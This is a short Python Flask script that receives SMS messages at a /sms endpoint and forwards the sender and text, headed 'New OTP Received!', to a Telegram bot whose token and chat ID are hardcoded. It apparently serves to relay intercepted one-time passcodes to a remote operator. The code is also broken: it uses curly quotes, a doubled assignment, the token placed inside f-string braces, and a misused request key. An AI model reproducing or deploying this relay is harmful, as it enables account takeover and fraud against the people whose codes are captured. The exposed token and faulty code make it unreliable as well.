from flask import Flask, request
import requests

TOKEN = “8414363863:AAH2ow8nPeyyqGnYDX1k_op7d2FA0PqLhTY”
CHAT_ID = “7766097917”

app = app = Flask(__name__)

def send_message(text):
url = f”https://api.telegram.org/bot{8414363863:AAH2ow8nPeyyqGnYDX1k_op7d2FA0PqLhTY}/sendMessage”
requests.post(url, data={“7766097917”: CHAT_ID, “text”: text})

@app.route(“/sms”, methods=[“POST”])
def sms_receiver():
sms_text = request.form.get(“message”)
sender = request.form.get(“from”)

msg = f”📩 New OTP Received!\nFrom: {sender}\nMessage: {sms_text}”
send_message(msg)
return “OK”

app.run(host=”0.0.0.0″, port=5000)